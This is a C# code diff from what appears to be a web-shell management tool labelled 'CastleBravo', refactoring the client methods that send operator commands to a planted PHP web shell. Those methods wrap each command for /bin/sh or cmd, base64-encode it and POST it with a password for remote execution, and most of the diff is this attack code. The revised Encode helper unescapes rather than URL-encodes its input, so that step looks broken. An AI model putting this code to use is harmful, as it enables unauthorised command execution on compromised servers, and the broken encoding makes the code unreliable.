@@ -5,7 +5,6 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Net;
 using System.Text;
-using System.Web;
 
 namespace C2.Business.CastleBravo.WebShellTool
 {
@@ -41,29 +40,30 @@ namespace C2.Business.CastleBravo.WebShellTool
             return paths.IsEmpty() ? Tuple.Create(string.Empty, string.Empty) : Tuple.Create(paths[0], string.Empty);
         }
 
-        public Tuple<string, string> CmdExcute(string excutePath, string command)
-        {   
-            bool isLinux = excutePath.StartsWith("/");
-            string cmdPath = isLinux ? "/bin/sh" : "cmd";//需要先判断是什么系统
-            string combineCommand = string.Format(isLinux ? "cd \"{0}\";{1};echo [S];pwd;echo [E]": "cd /d \"{0}\"&{1}&echo [S]&cd&echo [E]", excutePath, command);
-            string result = PHPShell(cmdPath, combineCommand, command);
+        public Tuple<string, string> Excute(string root, string command)
+        {
+            sb.AppendLine("========执行命令：" + command + "========");
 
-            string output;
-            string newPath;
-            string[] tmp = result.Split(new string[] { "[S]" }, StringSplitOptions.None);
+            //需要先判断是什么系统
+            bool isLinux = root.StartsWith("/");
+            string shellCmd = isLinux ? "/bin/sh" : "cmd";
+            string template = isLinux ? "cd \"{0}\";{1};echo [S];pwd;echo [E]" : "cd /d \"{0}\"&{1}&echo [S]&cd&echo [E]";
+            
+            string remoteCmd = string.Format(template, root, command);
+
+            string[] ret = PHPShell(shellCmd, remoteCmd).Split("[S]");
+
             try
             {
-                output = isLinux ? tmp[0].Replace("\n", "\r\n") : tmp[0];
-                newPath = tmp[1].Split(new string[] { "[E]" }, StringSplitOptions.None)[0].Trim(new char[] { '\n', '\r' });
+                ret[0] = isLinux ? ret[0].Replace("\n", "\r\n") : ret[0];
+                root   = ret[1].Split("[E]")[0].Trim(new char[] { '\n', '\r' });
             }
             catch
             {
-                return Tuple.Create(excutePath, string.Empty) ;
+                return Tuple.Create(root, string.Empty) ;
             }
 
-
-            return Tuple.Create(newPath, output);
-
+            return Tuple.Create(root, ret[0]);
         }
 
         public Tuple<string, List<WSFile>, List<string>> CurrentPathBrowse()
@@ -116,16 +116,15 @@ namespace C2.Business.CastleBravo.WebShellTool
         private string PHPReadDict(string path)
         {
             sb.AppendLine("========获取" + path + "文件========");
-            return PHPPost(password + "=" + clientSetting.PHP_MAKE + "&" + clientSetting.ACTION + "=" + clientSetting.PHP_READDICT + "&" + clientSetting.PARAM1 + "=" + TransStringToBase64(path));
+            return PHPPost(password + "=" + clientSetting.PHP_MAKE + "&" + clientSetting.ACTION + "=" + clientSetting.PHP_READDICT + "&" + clientSetting.PARAM1 + "=" + Encode(path));
         }
 
-        private string PHPShell(string cmdPath, string combineCommand, string oriCommand)
+        private string PHPShell(string shell, string command)
         {
-            sb.AppendLine("========执行命令：" + oriCommand + "========");
             return PHPPost(password + "=" + clientSetting.PHP_MAKE + "&" + 
                            clientSetting.ACTION + "=" + clientSetting.PHP_SHELL + "&" + 
-                           clientSetting.PARAM1 + "=" + TransStringToBase64(cmdPath) + "&" +
-                           clientSetting.PARAM2 + "=" + TransStringToBase64(combineCommand));
+                           clientSetting.PARAM1 + "=" + Encode(shell) + "&" +
+                           clientSetting.PARAM2 + "=" + Encode(command));
         }
 
         private string PHPPost(string payload)
@@ -163,9 +162,9 @@ namespace C2.Business.CastleBravo.WebShellTool
             return sourse.Remove(sprIndex);
         }
 
-        private string TransStringToBase64(string str)
+        private string Encode(string str)
         {
-            return HttpUtility.UrlEncode(Convert.ToBase64String(Encoding.UTF8.GetBytes(str)));
+            return Uri.UnescapeDataString(ST.EncodeBase64(str));  // HttpUtility.UrlEncode有+号坑,代替之
         }
     }
 
